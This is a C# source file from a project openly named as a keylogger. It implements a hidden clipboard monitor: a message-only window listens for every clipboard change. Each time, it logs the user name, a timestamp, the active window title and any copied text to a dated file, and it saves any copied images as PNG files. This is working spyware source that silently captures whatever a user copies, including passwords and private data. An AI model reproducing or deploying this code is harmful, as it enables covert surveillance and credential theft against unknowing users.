using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerVersion1._0
{
    public static class Clipboard
    {
        //<summary>
        //  Override Func() GetText of System.Windows.Form.Clipboard.GetText()
        //</summary>
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        //<summary>
        //  Override Func() GetImage of System.Windows.Form.Clipboard.GetImage()
        //</summary>
        public static Image GetImage()
        {
            Image ReturnImage = null;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnImage = System.Windows.Forms.Clipboard.GetImage();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
            return ReturnImage;
        }

        //<summary>
        //  Override Func() SetText of System.Windows.Form.Clipboard.SetText()
        //</summary>
        public static void SetText(string filename)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText($"![image]({Path.GetFileName(filename)})");
                });
        }
    }

    public class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            //<summary>
            //  Handle Event When HWND IS Turn On
            //</summary>
            public NotificationForm()
            {
                // Change State from Child into a Message-Only
                API.SetParent(Handle, API.HWND_MESSAGE);
                // Add Our Windows to the Clipboard Form Listener
                API.AddClipboardFormatListener(Handle);
            }

            //<summary>
            //  Override Func() WndProc of Form.WndProc(ref Message m)
            //</summary>
            protected override void WndProc(ref Message m)
            {   
                if (!Directory.Exists(API.SaveLogFileText))
                {
                    Directory.CreateDirectory(API.SaveLogFileText); 
                }    
                string path = API.SaveLogFileText + "/ClipBoardHistory" + " " + DateTime.Now.ToString("dd-MM-yyyy");
                Console.OutputEncoding = System.Text.Encoding.UTF8;
                base.WndProc(ref m);

                if (m.Msg == API.WM_CLIPBOARDUPDATE)
                {
                    using (StreamWriter sw = (File.Exists(path)) ? File.AppendText(path) : File.CreateText(path))
                    {
                        // UserName
                        //Console.WriteLine("\n\nUserName: " + API.userName);
                        sw.WriteLine("\n\nUserName: " + API.userName);
                        // Time To Occur Process
                        string saveTimeNow = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
                        //Console.WriteLine("Copy event detected at [{0}] !", saveTimeNow);
                        sw.WriteLine("Copy event detected at [{0}]", saveTimeNow);
                        // Appication is being used when Occur Process
                        string sb = API.GetActiveWindow();
                        //Console.WriteLine("Clipboard Active Windows: " + sb);
                        sw.WriteLine("Clipboard Active Windows: " + sb);

                        if (Clipboard.GetText() != "")
                        {
                            // Content in the Clipboard
                            //Console.WriteLine("Clipboard Content: " + Clipboard.GetText());
                            sw.WriteLine("Clipboard Content: " + Clipboard.GetText());
                        }

                        if (Clipboard.GetImage() != null)
                        {
                            // Content in the Clipboard
                            sw.WriteLine("Have 1 Image is save on Clipboard");
                            if (!Directory.Exists(API.SaveLogFileImage))
                            {
                                Directory.CreateDirectory(API.SaveLogFileImage);
                            }
                            string path1 = API.SaveLogFileImage;
                            var prefix = "clipbImage" + DateTime.Now.ToLongDateString();
                            var fileName = Enumerable.Range(1, 10000)
                                            .Select(n => Path.Combine(path1, $"{prefix}-{n}.png"))
                                            .First(p => !File.Exists(p));
                            try
                            {
                                Clipboard.GetImage().Save(fileName, ImageFormat.Png);
                                Clipboard.SetText(fileName);
                            }
                            catch (Exception exc)
                            {
                                Console.WriteLine(exc);
                            }
                        }
                    }
                }
            }

            public static void SetHookClipboard()
            {
                Application.Run(new NotificationForm());
            }
        }
    }
}
